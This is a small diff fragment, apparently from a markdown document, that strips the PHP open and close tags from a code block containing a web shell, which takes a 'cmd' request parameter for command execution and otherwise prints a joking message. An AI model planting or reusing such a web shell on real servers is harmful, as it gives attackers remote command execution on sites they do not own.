@@ -7,7 +7,6 @@
  
 
 ```
-<?php
 
   if(isset($_REQUEST['cmd'])) {
     $cmd = ($_REQUEST['cmd']);
@@ -15,8 +14,7 @@
   } else {
     echo "This is robbing a website-act!";
   }
-  
-?>
+ 
 
 ```
 
